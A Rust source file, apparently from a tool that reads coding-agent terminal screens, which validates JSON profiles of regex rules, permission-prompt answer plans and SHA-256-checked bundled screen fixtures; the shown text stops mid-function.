use crate::broker::runtime::Coverage;
use crate::broker::runtime::InteractionClass;
use crate::broker::runtime::PermissionDecision;
use crate::coding_agent::CodingAgent;
use crate::coding_agent::NativeVersion;
use crate::coding_agent::detector::ObservationKind;
use crate::error::CafleetError;
use crate::error::Result;
use regex::Regex;
use serde_json::Map;
use serde_json::Value;
use std::collections::BTreeMap;
use std::collections::BTreeSet;

#[cfg(test)]
use crate::coding_agent::detector::AnnotationBlock;
#[cfg(test)]
use crate::coding_agent::detector::Detector;

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum AnswerKey {
    Decision(PermissionDecision),
    Choice(String),
}
impl AnswerKey {
    pub(crate) fn decision(&self) -> Option<PermissionDecision> {
        match self {
            Self::Decision(decision) => Some(*decision),
            Self::Choice(_) => None,
        }
    }
    pub(crate) fn choice(&self) -> Option<&str> {
        match self {
            Self::Decision(_) => None,
            Self::Choice(choice) => Some(choice),
        }
    }
}

pub(crate) fn valid_choice_id(value: &str) -> bool {
    value.len() <= 64
        && !value.is_empty()
        && value.split('-').all(|part| {
            !part.is_empty()
                && part
                    .bytes()
                    .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())
        })
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct AnswerCapability {
    backend: CodingAgent,
    native_version: String,
    request_rule_id: String,
    answer_rule_id: String,
    key: AnswerKey,
    fixture_ids: Vec<String>,
}
impl AnswerCapability {
    pub(crate) fn backend(&self) -> CodingAgent {
        self.backend
    }
    pub(crate) fn native_version(&self) -> &str {
        &self.native_version
    }
    pub(crate) fn request_rule_id(&self) -> &str {
        &self.request_rule_id
    }
    pub(crate) fn answer_rule_id(&self) -> &str {
        &self.answer_rule_id
    }
    pub(crate) fn key(&self) -> &AnswerKey {
        &self.key
    }
    pub(crate) fn fixture_ids(&self) -> &[String] {
        &self.fixture_ids
    }

    #[cfg(test)]
    pub(crate) fn fixture(
        backend: CodingAgent,
        native_version: &str,
        request_rule_id: &str,
        answer_rule_id: &str,
        decision: PermissionDecision,
        fixture_ids: &[String],
    ) -> std::result::Result<Self, CafleetError> {
        Self::fixture_key(
            backend,
            native_version,
            request_rule_id,
            answer_rule_id,
            AnswerKey::Decision(decision),
            fixture_ids,
        )
    }

    #[cfg(test)]
    pub(crate) fn fixture_key(
        backend: CodingAgent,
        native_version: &str,
        request_rule_id: &str,
        answer_rule_id: &str,
        key: AnswerKey,
        fixture_ids: &[String],
    ) -> std::result::Result<Self, CafleetError> {
        if [native_version, request_rule_id, answer_rule_id]
            .iter()
            .any(|value| value.trim().is_empty())
            || fixture_ids.is_empty()
            || fixture_ids.iter().any(|value| value.trim().is_empty())
        {
            return Err(CafleetError::App(
                "answer capability requires complete profile provenance".into(),
            ));
        }
        Ok(Self {
            backend,
            native_version: native_version.into(),
            request_rule_id: request_rule_id.into(),
            answer_rule_id: answer_rule_id.into(),
            key,
            fixture_ids: fixture_ids.to_vec(),
        })
    }
}

fn invalid(message: impl Into<String>) -> CafleetError {
    CafleetError::Usage(format!("invalid native profile: {}", message.into()))
}

fn require(ok: bool, message: &str) -> Result<()> {
    if ok { Ok(()) } else { Err(invalid(message)) }
}
pub(super) fn object<'a>(value: &'a Value, keys: &[&str]) -> Result<&'a Map<String, Value>> {
    let map = value
        .as_object()
        .ok_or_else(|| invalid("object required"))?;
    require(
        map.len() == keys.len() && keys.iter().all(|key| map.contains_key(*key)),
        "exact required object fields expected",
    )?;
    Ok(map)
}
fn text(value: &Value) -> Result<String> {
    let text = value.as_str().ok_or_else(|| invalid("text required"))?;
    require(!text.trim().is_empty(), "nonblank text required")?;
    Ok(text.into())
}
fn array(value: &Value) -> Result<&Vec<Value>> {
    value.as_array().ok_or_else(|| invalid("array required"))
}
fn texts(value: &Value) -> Result<Vec<String>> {
    let values = array(value)?.iter().map(text).collect::<Result<Vec<_>>>()?;
    require(
        values.iter().collect::<BTreeSet<_>>().len() == values.len(),
        "duplicate string identity",
    )?;
    Ok(values)
}
fn boolean(value: &Value) -> Result<bool> {
    value.as_bool().ok_or_else(|| invalid("boolean required"))
}
fn backend(value: &Value) -> Result<CodingAgent> {
    crate::coding_agent::coding_agent(&text(value)?).ok_or_else(|| invalid("unknown backend"))
}
fn positive(value: &Value) -> Result<u16> {
    value
        .as_u64()
        .and_then(|n| u16::try_from(n).ok())
        .filter(|n| *n > 0)
        .ok_or_else(|| invalid("positive viewport bound required"))
}
fn one_of<T: Copy>(value: &Value, choices: &[(&str, T)]) -> Result<T> {
    let value = text(value)?;
    choices
        .iter()
        .find(|(name, _)| *name == value)
        .map(|(_, choice)| *choice)
        .ok_or_else(|| invalid("invalid profile enum"))
}
fn expression(value: &Value) -> Result<Regex> {
    Regex::new(&text(value)?).map_err(|cause| invalid(format!("regex: {cause}")))
}
fn unique(ids: &mut BTreeSet<String>, id: &str) -> Result<()> {
    require(ids.insert(id.into()), "duplicate profile identity")
}
fn semver(value: &Value) -> Result<NativeVersion> {
    NativeVersion::parse(&text(value)?).ok_or_else(|| invalid("canonical SemVer version required"))
}
fn lower_hex(value: &str) -> bool {
    value
        .bytes()
        .all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
}
#[derive(Clone, PartialEq, Eq)]
pub(super) struct Fixture {
    pub(crate) id: String,
    pub(crate) native: bool,
    pub(crate) backend: CodingAgent,
    pub(crate) version: NativeVersion,
}
#[derive(Clone)]
pub(super) struct Capture {
    pub(crate) matcher: String,
    pub(crate) name: String,
    pub(crate) row_margin: Option<String>,
    pub(crate) margin_rows: MarginRows,
    pub(crate) row_trailer: Option<String>,
}
#[derive(Clone, Copy, PartialEq, Eq)]
pub(super) enum MarginRows {
    All,
    Continuation,
}
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "snake_case")]
pub(crate) enum ChoiceScope {
    SingleRequest,
    Session,
    Persistent,
}
#[derive(Clone)]
pub(super) struct Choice {
    pub(crate) id: String,
    pub(crate) label: Capture,
    pub(crate) scope: ChoiceScope,
}
#[derive(Clone, Copy, PartialEq, Eq)]
pub(super) enum MatcherScope {
    Line,
    Region,
}
#[derive(Clone)]
pub(super) struct Matcher {
    pub(crate) id: String,
    pub(crate) scope: MatcherScope,
    pub(crate) regex: Regex,
    pub(crate) focus_style: Option<FocusStyle>,
}
#[derive(Clone, Copy, PartialEq, Eq)]
pub(super) enum FocusStyle {
    Background,
    Marker,
}
#[derive(Clone)]
pub(super) struct Continuation {
    pub(crate) rule_id: String,
    pub(crate) choice_id: String,
    pub(crate) fixtures: Vec<String>,
}
#[derive(Clone, Copy, PartialEq, Eq)]
pub(super) enum ScreenSelector {
    Primary,
    Alternate,
    Either,
}
#[derive(Clone, Copy, PartialEq, Eq)]
pub(super) enum CursorRule {
    AtEnd,
    Inside,
    Outside,
    Any,
}
#[derive(Clone)]
pub(super) struct Region {
    pub(crate) screen: ScreenSelector,
    pub(crate) start: Regex,
    pub(crate) end: Regex,
    pub(crate) max_rows: u16,
    pub(crate) cursor: CursorRule,
    pub(crate) panel_separator: Option<char>,
}
#[derive(Clone)]
pub(super) struct Frame {
    pub(crate) require: Vec<Regex>,
    pub(crate) reject: Vec<Regex>,
}
#[derive(Clone)]
pub(super) struct Rule {
    pub(crate) id: String,
    pub(crate) priority: i64,
    pub(crate) kind: ObservationKind,
    pub(crate) region: Region,
    pub(crate) matchers: Vec<Matcher>,
    pub(crate) operation: Option<Capture>,
    pub(crate) choices: Vec<Choice>,
    pub(crate) native: Option<Capture>,
    pub(crate) verified: bool,
    pub(crate) sensitive: bool,
    pub(crate) continuation: Option<Continuation>,
    pub(crate) frame: Option<Frame>,
}
#[derive(Clone)]
pub(super) struct Capability {
    pub(crate) rules: Vec<String>,
}
#[derive(Clone)]
pub(super) struct Answer {
    pub(crate) key: AnswerKey,
    pub(crate) request: String,
    pub(crate) id: String,
    pub(crate) fixtures: Vec<String>,
    pub(crate) choice_id: String,
    pub(crate) focus_matcher_id: String,
    pub(crate) stages: Vec<AnswerStage>,
}

#[derive(Clone, PartialEq, Eq)]
pub(crate) struct AnswerStage {
    bytes: Vec<u8>,
    required_rule_id: String,
    required_choice_id: String,
    gate: Option<StageGate>,
}
#[derive(Clone, PartialEq, Eq)]
pub(crate) enum StageGate {
    Focus(String),
    Screen(String),
}
impl AnswerStage {
    pub(crate) fn bytes(&self) -> &[u8] {
        &self.bytes
    }
    pub(crate) fn required_rule_id(&self) -> &str {
        &self.required_rule_id
    }
    pub(crate) fn required_choice_id(&self) -> &str {
        &self.required_choice_id
    }
    pub(crate) fn gate(&self) -> Option<&StageGate> {
        self.gate.as_ref()
    }
    pub(crate) fn required_focus_choice_id(&self) -> Option<&str> {
        match &self.gate {
            Some(StageGate::Focus(choice)) => Some(choice),
            _ => None,
        }
    }
    #[cfg(test)]
    pub(crate) fn required_screen_rule_id(&self) -> Option<&str> {
        match &self.gate {
            Some(StageGate::Screen(rule)) => Some(rule),
            _ => None,
        }
    }
}

#[derive(Clone, PartialEq, Eq)]
pub(crate) struct AnswerPlan {
    capability: AnswerCapability,
    choice_id: String,
    choice_scope: ChoiceScope,
    focus_matcher_id: String,
    stages: Vec<AnswerStage>,
}
impl AnswerPlan {
    pub(crate) fn capability(&self) -> &AnswerCapability {
        &self.capability
    }
    pub(crate) fn choice_id(&self) -> &str {
        &self.choice_id
    }
    pub(crate) fn choice_scope(&self) -> ChoiceScope {
        self.choice_scope
    }
    pub(crate) fn focus_matcher_id(&self) -> &str {
        &self.focus_matcher_id
    }
    pub(crate) fn stages(&self) -> &[AnswerStage] {
        &self.stages
    }
}
#[derive(Clone)]
pub(super) struct Profile {
    pub(crate) backend: CodingAgent,
    pub(crate) min_version: NativeVersion,
    pub(crate) min_version_text: String,
    pub(crate) rules: Vec<Rule>,
    pub(crate) detection: Option<Capability>,
    pub(crate) composer: Option<Capability>,
    pub(crate) annotations: Option<Capability>,
    pub(crate) submissions: [Option<ComposerSubmission>; 2],
    pub(crate) answers: Vec<Answer>,
}
struct Interval<'a> {
    min: &'a NativeVersion,
    next: Option<&'a NativeVersion>,
}
impl Interval<'_> {
    fn contains(&self, version: &NativeVersion) -> bool {
        version.precedence(self.min).is_ge()
            && self
                .next
                .is_none_or(|next| version.precedence(next).is_lt())
    }
}
impl Profile {
    pub(super) fn answer_plan(
        &self,
        version: &str,
        request: &str,
        key: &AnswerKey,
    ) -> Option<AnswerPlan> {
        let answer = self
            .answers
            .iter()
            .find(|a| a.request == request && &a.key == key)?;
        let choice_scope = self
            .rules
            .iter()
            .find(|rule| rule.id == request)
            .and_then(|rule| rule.choices.iter().find(|c| c.id == answer.choice_id))
            .expect("validated answer request rule and choice")
            .scope;
        Some(AnswerPlan {
            capability: AnswerCapability {
                backend: self.backend,
                native_version: version.into(),
                request_rule_id: request.into(),
                answer_rule_id: answer.id.clone(),
                key: key.clone(),
                fixture_ids: answer.fixtures.clone(),
            },
            choice_id: answer.choice_id.clone(),
            choice_scope,
            focus_matcher_id: answer.focus_matcher_id.clone(),
            stages: answer.stages.clone(),
        })
    }
    /// Every plan of the request rule: decisions in `allow`, `deny` order, then choices in the
    /// rule's choice order.
    pub(super) fn answer_plans(&self, version: &str, request: &str) -> Vec<AnswerPlan> {
        let Some(rule) = self.rules.iter().find(|rule| rule.id == request) else {
            return Vec::new();
        };
        [PermissionDecision::Allow, PermissionDecision::Deny]
            .into_iter()
            .map(AnswerKey::Decision)
            .chain(
                rule.choices
                    .iter()
                    .map(|choice| AnswerKey::Choice(choice.id.clone())),
            )
            .filter_map(|key| self.answer_plan(version, request, &key))
            .collect()
    }
}
#[derive(Clone)]
pub(crate) struct ProfileCatalog {
    profiles: Vec<Profile>,
    #[cfg(test)]
    capture_origin: &'static str,
}
pub(crate) struct NativeCapabilities {
    #[cfg(test)]
    pub(crate) backend: CodingAgent,
    #[cfg(test)]
    pub(crate) native_version: Option<String>,
    #[cfg(test)]
    pub(crate) min_version: Option<String>,
    pub(crate) detection: Coverage,
    #[cfg(test)]
    pub(crate) composer: Coverage,
    #[cfg(test)]
    pub(crate) prompt_submission: Coverage,
    #[cfg(test)]
    pub(crate) native_exec_submission: Coverage,
    #[cfg(test)]
    pub(crate) answer_decisions: Vec<PermissionDecision>,
    #[cfg(test)]
    pub(crate) capability_reason: Option<String>,
}
fn capture(value: &Value, matchers: &[Matcher]) -> Result<Capture> {
    let map = object(value, &["matcher_id", "capture"])?;
    let matcher = text(&map["matcher_id"])?;
    let name = text(&map["capture"])?;
    let rule = matchers
        .iter()
        .find(|item| item.id == matcher)
        .ok_or_else(|| invalid("unknown capture matcher"))?;
    require(
        rule.regex
            .capture_names()
            .flatten()
            .any(|candidate| candidate == name),
        "unknown named capture",
    )?;
    Ok(Capture {
        matcher,
        name,
        row_margin: None,
        margin_rows: MarginRows::All,
        row_trailer: None,
    })
}
fn optional_capture(value: &Value, matchers: &[Matcher]) -> Result<Option<Capture>> {
    if value.is_null() {
        Ok(None)
    } else {
        capture(value, matchers).map(Some)
    }
}
fn operation_capture(value: &Value, matchers: &[Matcher]) -> Result<Option<Capture>> {
    if value.is_null() {
        return Ok(None);
    }
    let mut plain = value
        .as_object()
        .ok_or_else(|| invalid("object required"))?
        .clone();
    let row_margin = plain
        .remove("row_margin")
        .map(|margin| {
            margin
                .as_str()
                .filter(|margin| !margin.is_empty() && !margin.contains('\n'))
                .map(str::to_owned)
                .ok_or_else(|| invalid("nonempty single-row margin required"))
        })
        .transpose()?;
    let margin_rows = match plain.remove("margin_rows") {
        None => MarginRows::All,
        Some(rows) => {
            require(row_margin.is_some(), "margin_rows requires row_margin")?;
            match rows.as_str() {
                Some("all") => MarginRows::All,
                Some("continuation") => MarginRows::Continuation,
                _ => return Err(invalid("margin_rows must be all or continuation")),
            }
        }
    };
    let row_trailer = plain
        .remove("row_trailer")
        .map(|trailer| {
            trailer
                .as_str()
                .filter(|trailer| {
                    !trailer.is_empty() && !trailer.contains('\n') && trailer.trim() == *trailer
                })
                .map(str::to_owned)
                .ok_or_else(|| invalid("trimmed nonempty single-row trailer required"))
        })
        .transpose()?;
    Ok(Some(Capture {
        row_margin,
        margin_rows,
        row_trailer,
        ..capture(&Value::Object(plain), matchers)?
    }))
}
const REGION_FIELDS: [&str; 5] = [
    "screen",
    "start_pattern",
    "end_pattern",
    "max_rows",
    "cursor",
];
const RULE_FIELDS: [&str; 8] = [
    "id",
    "priority",
    "observation",
    "region",
    "matchers",
    "extract",
    "verified_noninteraction",
    "sensitive",
];
const CONTINUATION_FIELDS: [&str; 3] = ["continues_rule_id", "continues_choice_id", "fixture_ids"];
fn compile_rule(value: &Value) -> Result<Rule> {
    let kind = ObservationKind::parse(&text(
        value
            .get("observation")
            .ok_or_else(|| invalid("rule observation required"))?,
    )?)?;
    let continues = kind == ObservationKind::PermissionContinuation;
    let annotation = kind.is_annotation();
    let interaction_frame =
        matches!(kind, ObservationKind::Interaction(_)) && value.get("frame").is_some();
    let fields = if continues {
        RULE_FIELDS
            .iter()
            .chain(&CONTINUATION_FIELDS)
            .copied()
            .collect()
    } else if annotation || interaction_frame {
        RULE_FIELDS.iter().chain(&["frame"]).copied().collect()
    } else {
        RULE_FIELDS.to_vec()
    };
    let m = object(value, &fields)?;
    let id = text(&m["id"])?;
    let priority = m["priority"]
        .as_i64()
        .ok_or_else(|| invalid("integer priority required"))?;
    let verified = boolean(&m["verified_noninteraction"])?;
    require(
        !verified
            || !matches!(
                kind,
                ObservationKind::Interaction(_)
                    | ObservationKind::Unknown
                    | ObservationKind::PermissionContinuation
            ),
        "interaction/unknown/continuation cannot verify noninteraction",
    )?;
    let continuation = if continues {
        Some(Continuation {
            rule_id: text(&m["continues_rule_id"])?,
            choice_id: text(&m["continues_choice_id"])?,
            fixtures: texts(&m["fixture_ids"])?,
        })
    } else {
        None
    };
    let separated = m["region"].get("panel_separator").is_some();
    let region_fields = REGION_FIELDS
        .iter()
        .copied()
        .chain(separated.then_some("panel_separator"))
        .collect::<Vec<_>>();
    let r = object(&m["region"], &region_fields)?;
    let region = Region {
        screen: one_of(
            &r["screen"],
            &[
                ("primary", ScreenSelector::Primary),
                ("alternate", ScreenSelector::Alternate),
                ("either", ScreenSelector::Either),
            ],
        )?,
        start: expression(&r["start_pattern"])?,
        end: expression(&r["end_pattern"])?,
        max_rows: positive(&r["max_rows"])?,
        cursor: one_of(
            &r["cursor"],
            &[
                ("at_end", CursorRule::AtEnd),
                ("inside", CursorRule::Inside),
                ("outside", CursorRule::Outside),
                ("any", CursorRule::Any),
            ],
        )?,
        panel_separator: if separated {
            Some(panel_separator(&r["panel_separator"])?)
        } else {
            None
        },
    };
    let mut ids = BTreeSet::new();
    let mut matchers = Vec::new();
    for v in array(&m["matchers"])? {
        let styled = v.get("focus_style").is_some();
        let m = if styled {
            object(v, &["id", "scope", "pattern", "focus_style"])?
        } else {
            object(v, &["id", "scope", "pattern"])?
        };
        let focus_style = if styled {
            Some(one_of(
                &m["focus_style"],
                &[
                    ("background", FocusStyle::Background),
                    ("marker", FocusStyle::Marker),
                ],
            )?)
        } else {
            None
        };
        let id = text(&m["id"])?;
        unique(&mut ids, &id)?;
        matchers.push(Matcher {
            id,
            scope: one_of(
                &m["scope"],
                &[
                    ("line", MatcherScope::Line),
                    ("region", MatcherScope::Region),
                ],
            )?,
            regex: expression(&m["pattern"])?,
            focus_style,
        });
    }
    require(!matchers.is_empty(), "required matchers cannot be empty")?;
    let ex = object(
        &m["extract"],
        &["operation", "choices", "native_request_id"],
    )?;
    let mut choices = Vec::new();
    let mut ids = BTreeSet::new();
    for v in array(&ex["choices"])? {
        let c = object(v, &["id", "label", "scope"])?;
        let id = text(&c["id"])?;
        unique(&mut ids, &id)?;
        choices.push(Choice {
            id,
            label: capture(&c["label"], &matchers)?,
            scope: one_of(
                &c["scope"],
                &[
                    ("single_request", ChoiceScope::SingleRequest),
                    ("session", ChoiceScope::Session),
                    ("persistent", ChoiceScope::Persistent),
                ],
            )?,
        });
    }
    require(
        !continues || (ex["operation"].is_null() && choices.is_empty()),
        "continuation declares no operation or choices",
    )?;
    let operation = operation_capture(&ex["operation"], &matchers)?;
    let native = optional_capture(&ex["native_request_id"], &matchers)?;
    let frame = if annotation {
        require(
            choices.is_empty() && native.is_none() && !verified,
            "annotation rules declare no choices, native request id or verified noninteraction",
        )?;
        require(
            operation.is_some() == (kind == ObservationKind::AutomaticRefusal),
            "only automatic refusal annotations capture an operation",
        )?;
        Some(compile_frame(&m["frame"], FrameOwner::Annotation)?)
    } else if interaction_frame {
        Some(compile_frame(&m["frame"], FrameOwner::Interaction)?)
    } else {
        None
    };
    Ok(Rule {
        id,
        priority,
        kind,
        region,
        operation,
        native,
        choices,
        matchers,
        verified,
        sensitive: boolean(&m["sensitive"])?,
        continuation,
        frame,
    })
}
fn panel_separator(value: &Value) -> Result<char> {
    let glyph = value
        .as_str()
        .ok_or_else(|| invalid("panel separator text required"))?;
    let mut chars = glyph.chars();
    match (chars.next(), chars.next()) {
        (Some(separator), None) if !separator.is_whitespace() => Ok(separator),
        _ => Err(invalid("panel separator requires one non-whitespace glyph")),
    }
}
#[derive(Clone, Copy, PartialEq, Eq)]
enum FrameOwner {
    Annotation,
    Interaction,
}
fn compile_frame(value: &Value, owner: FrameOwner) -> Result<Frame> {
    let m = object(value, &["require_patterns", "reject_patterns"])?;
    let patterns = |value: &Value| {
        array(value)?
            .iter()
            .map(expression)
            .collect::<Result<Vec<_>>>()
    };
    let require_patterns = patterns(&m["require_patterns"])?;
    let reject_patterns = patterns(&m["reject_patterns"])?;
    match owner {
        FrameOwner::Annotation => require(
            !require_patterns.is_empty(),
            "annotation frame requires a live-screen pattern",
        )?,
        FrameOwner::Interaction => require(
            !reject_patterns.is_empty(),
            "interaction frame requires a reject pattern",
        )?,
    }
    Ok(Frame {
        require: require_patterns,
        reject: reject_patterns,
    })
}
const ANSWER_FIELDS: [&str; 7] = [
    "decision",
    "request_rule_id",
    "answer_rule_id",
    "choice_id",
    "focus_matcher_id",
    "stages",
    "fixture_ids",
];
const STAGE_FIELDS: [&str; 3] = ["bytes_hex", "required_rule_id", "required_choice_id"];
fn stage_fields(value: &Value) -> Result<(&Map<String, Value>, Option<StageGate>)> {
    let focus = value.get("required_focus_choice_id").is_some();
    let screen = value.get("required_screen_rule_id").is_some();
    require(!(focus && screen), "a stage declares at most one gate")?;
    let gate_field = if focus {
        Some("required_focus_choice_id")
    } else if screen {
        Some("required_screen_rule_id")
    } else {
        None
    };
    let fields = STAGE_FIELDS
        .iter()
        .copied()
        .chain(gate_field)
        .collect::<Vec<_>>();
    let map = object(value, &fields)?;
    let gate = match gate_field {
        Some(field) => {
            let id = text(&map[field])?;
            Some(if focus {
                StageGate::Focus(id)
            } else {
                StageGate::Screen(id)
            })
        }
        None => None,
    };
    Ok((map, gate))
}
fn validate_gates(
    stages: &[AnswerStage],
    request: &Rule,
    rules: &[Rule],
    choice_id: &str,
    focus_matcher: &str,
) -> Result<()> {
    if stages.iter().all(|stage| stage.gate.is_none()) {
        return Ok(());
    }
    require(
        stages.iter().all(|stage| stage.gate.is_some()),
        "a gated plan gates every stage",
    )?;
    let continuation = |id: &str| {
        rules
            .iter()
            .find(|rule| rule.id == id)
            .and_then(|rule| rule.continuation.as_ref())
            .ok_or_else(|| invalid("screen gate names no continuation rule"))
    };
    let mut focus_gated = false;
    for (index, stage) in stages.iter().enumerate() {
        match stage.gate.as_ref().expect("every stage is gated") {
            StageGate::Focus(choice) => {
                focus_gated = true;
                require(
                    request.choices.iter().any(|c| &c.id == choice),
                    "focus gate names no choice of the request rule",
                )?;
            }
            StageGate::Screen(rule) => {
                let continuation = continuation(rule)?;
                require(
                    continuation.rule_id == request.id,
                    "screen gate continues another request rule",
                )?;
                let previous = index
                    .checked_sub(1)
                    .and_then(|previous| stages[previous].required_focus_choice_id());
                require(
                    previous == Some(continuation.choice_id.as_str()),
                    "screen gate follows the stage selecting its continued choice",
                )?;
            }
        }
    }
    let final_choice = match stages.last().and_then(AnswerStage::gate) {
        Some(StageGate::Focus(choice)) => choice.as_str(),
        Some(StageGate::Screen(rule)) => continuation(rule)?.choice_id.as_str(),
        None => unreachable!("validated gated final stage"),
    };
    require(
        final_choice == choice_id,
        "a gated plan ends on its own choice",
    )?;
    if focus_gated {
        let matcher = request
            .matchers
            .iter()
            .find(|matcher| matcher.id == focus_matcher)
            .expect("validated focus matcher");
        require(
            matcher.focus_style.is_some(),
            "a focus-gated plan needs a focus_style matcher",
        )?;
        for choice in &request.choices {
            let label = request
                .matchers
                .iter()
                .find(|matcher| matcher.id == choice.label.matcher)
                .expect("validated choice label matcher");
            require(
                label.scope == MatcherScope::Line,
                "focus-gated choice labels are line-scoped",
            )?;
        }
    }
    Ok(())
}
fn validate_continuation(
    rule: &Rule,
    rules: &[Rule],
    backend: CodingAgent,
    interval: &Interval,
    fixtures: &[Fixture],
) -> Result<()> {
    let Some(continuation) = &rule.continuation else {
        return Ok(());
    };
    let continued = rules
        .iter()
        .find(|candidate| candidate.id == continuation.rule_id)
        .ok_or_else(|| invalid("continuation names an unknown rule"))?;
    require(
        continued.kind
            == ObservationKind::Interaction(
                crate::broker::runtime::InteractionClass::PermissionRequest,
            ),
        "continuation continues a permission request rule",
    )?;
    require(
        continued
            .choices
            .iter()
            .any(|choice| choice.id == continuation.choice_id),
        "continuation names an unknown continued choice",
    )?;
    provenance(&continuation.fixtures, backend, interval, fixtures)?;
    require(
        continuation.fixtures.iter().all(|id| {
            fixtures
                .iter()
                .any(|fixture| &fixture.id == id && fixture.native)
        }),
        "continuation cites native fixtures",
    )
}
fn provenance(
    ids: &[String],
    backend: CodingAgent,
    interval: &Interval,
    fixtures: &[Fixture],
) -> Result<()> {
    require(!ids.is_empty(), "capability provenance required")?;
    for id in ids {
        let f = fixtures
            .iter()
            .find(|f| &f.id == id)
            .ok_or_else(|| invalid("unknown fixture"))?;
        require(
            f.backend == backend && interval.contains(&f.version),
            "fixture backend or capture version outside the profile interval",
        )?;
    }
    Ok(())
}
#[derive(Clone, Copy, PartialEq, Eq)]
enum Group {
    Detection,
    Composer,
    Annotations,
}
impl Group {
    fn of(kind: ObservationKind) -> Self {
        if kind.is_annotation() {
            Self::Annotations
        } else if matches!(
            kind,
            ObservationKind::ComposerEmpty | ObservationKind::ComposerDraft
        ) {
            Self::Composer
        } else {
            Self::Detection
        }
    }
}
fn capability(
    value: &Value,
    group: Group,
    rules: &[Rule],
    backend: CodingAgent,
    interval: &Interval,
    fixtures: &[Fixture],
) -> Result<Option<Capability>> {
    if value.is_null() {
        return Ok(None);
    }
    let fields: &[&str] = if group == Group::Composer && value.get("submission").is_some() {
        &["rule_ids", "fixture_ids", "submission"]
    } else {
        &["rule_ids", "fixture_ids"]
    };
    let m = object(value, fields)?;
    let ids = texts(&m["rule_ids"])?;
    require(!ids.is_empty(), "capability rules required")?;
    for id in &ids {
        let rule = rules
            .iter()
            .find(|r| &r.id == id)
            .ok_or_else(|| invalid("unknown capability rule"))?;
        require(
            Group::of(rule.kind) == group,
            "capability rule component mismatch",
        )?;
    }
    provenance(&texts(&m["fixture_ids"])?, backend, interval, fixtures)?;
    Ok(Some(Capability { rules: ids }))
}

fn decoded_hex(value: &str) -> Vec<u8> {
    (0..value.len())
        .step_by(2)
        .map(|index| {
            u8::from_str_radix(&value[index..index + 2], 16)
                .expect("validated lowercase hexadecimal byte")
        })
        .collect()
}

fn composer_submission(
    value: &Value,
    operation: ComposerOperation,
    backend: CodingAgent,
    interval: &Interval,
    fixtures: &[Fixture],
) -> Result<Option<ComposerSubmission>> {
    if value.is_null() {
        return Ok(None);
    }
    let m = object(value, &["prefix_hex", "submit_hex", "fixture_ids"])?;
    let prefix = m["prefix_hex"]
        .as_str()
        .ok_or_else(|| invalid("composer prefix string required"))?;
    require(
        prefix == operation.prefix_hex(),
        "composer prefix must match its operation",
    )?;
    let submit = m["submit_hex"]
        .as_str()
        .ok_or_else(|| invalid("composer submit string required"))?;
    require(
        (2..=64).contains(&submit.len()) && submit.len().is_multiple_of(2) && lower_hex(submit),
        "composer submit requires 1–32 lowercase hexadecimal bytes",
    )?;
    let fixture_ids = texts(&m["fixture_ids"])?;
    provenance(&fixture_ids, backend, interval, fixtures)?;
    Ok(Some(ComposerSubmission {
        prefix: decoded_hex(prefix),
        submit: decoded_hex(submit),
        fixture_ids,
    }))
}

fn composer_submissions(
    value: &Value,
    backend: CodingAgent,
    interval: &Interval,
    fixtures: &[Fixture],
) -> Result<[Option<ComposerSubmission>; 2]> {
    let Some(submission) = value.get("submission") else {
        return Ok([None, None]);
    };
    let m = object(submission, &["prompt", "exec"])?;
    Ok([
        composer_submission(
            &m["prompt"],
            ComposerOperation::Prompt,
            backend,
            interval,
            fixtures,
        )?,
        composer_submission(
            &m["exec"],
            ComposerOperation::Exec,
            backend,
            interval,
            fixtures,
        )?,
    ])
}

const BUNDLED_DEFINITIONS: &str = include_str!("bundled.json");
const CLAUDE_FIXTURES: &[u8] = include_bytes!("native/claude.json");
const CODEX_FIXTURES: &[u8] = include_bytes!("native/codex.json");
const OPENCODE_FIXTURES: &[u8] = include_bytes!("native/opencode.json");
const HERMES_FIXTURES: &[u8] = include_bytes!("native/hermes.json");
const BUNDLED_FIXTURES: &[(&str, &[u8])] = &[
    ("native/claude.json", CLAUDE_FIXTURES),
    ("native/codex.json", CODEX_FIXTURES),
    ("native/opencode.json", OPENCODE_FIXTURES),
    ("native/hermes.json", HERMES_FIXTURES),
];

fn verify_bundled_fixtures(entries: &[Value], embedded: &[(&str, &[u8])]) -> Result<()> {
    let mut sources = BTreeMap::<String, Vec<&Value>>::new();
    for entry in entries {
        require(
            entry["kind"] == "native",
            "bundled fixtures require native provenance",
        )?;
        let source = text(&entry["source_ref"])?;
        require(
            embedded.iter().any(|(reference, _)| *reference == source),
            "bundled fixture bytes are not embedded",
        )?;
        sources.entry(source).or_default().push(entry);
    }
    for (source, bytes) in embedded {
        let file: Value = serde_json::from_slice(bytes)
            .map_err(|cause| invalid(format!("bundled fixture: {cause}")))?;
        let entries = sources.get(*source).map(Vec::as_slice).unwrap_or(&[]);
        let screens = verify_native_fixture_file(&file, entries)?;
        for entry in entries {
            let id = text(&entry["id"])?;
            let screen = screens
                .get(&id)
                .expect("the file guard verified every catalogued screen");
            verify_native_screen(entry, screen)?;
        }
    }
    Ok(())
}

fn verify_native_fixture_file<'a>(
    file: &'a Value,
    entries: &[&Value],
) -> Result<&'a Map<String, Value>> {
    let file = object(
        file,
        &["schema_version", "backend", "provenance", "screens"],
    )?;
    require(
        file["schema_version"].as_u64() == Some(1)
            && file["provenance"] == "native"
            && entries
                .iter()
                .all(|entry| file["backend"] == entry["backend"]),
        "bundled fixture file identity differs from its catalog entry",
    )?;
    backend(&file["backend"])?;
    let screens = file["screens"]
        .as_object()
        .ok_or_else(|| invalid("object required"))?;
    for entry in entries {
        require(
            screens.contains_key(&text(&entry["id"])?),
            "bundled fixture screen is missing",
        )?;
    }
    require(
        screens.keys().all(|id| {
            entries
                .iter()
                .any(|entry| entry["id"].as_str() == Some(id.as_str()))
        }),
        "bundled fixture file holds an uncited screen",
    )?;
    Ok(screens)
}

fn verify_native_screen(entry: &Value, screen: &Value) -> Result<()> {
    let id = text(&entry["id"])?;
    let recorded = text(&entry["sha256"])?;
    let computed = crate::digest::sha256_hex(crate::digest::canonical_json(screen).as_bytes());
    require(
        recorded == computed,
        &format!(
            "bundled fixture digest mismatch for {id}: catalog {recorded}, computed {computed}"
        ),
    )?;
    let backgrounds = screen.get("cell_backgrounds").is_some();
    let fields = SCREEN_FIELDS
        .iter()
        .copied()
        .chain(backgrounds.then_some("cell_backgrounds"))
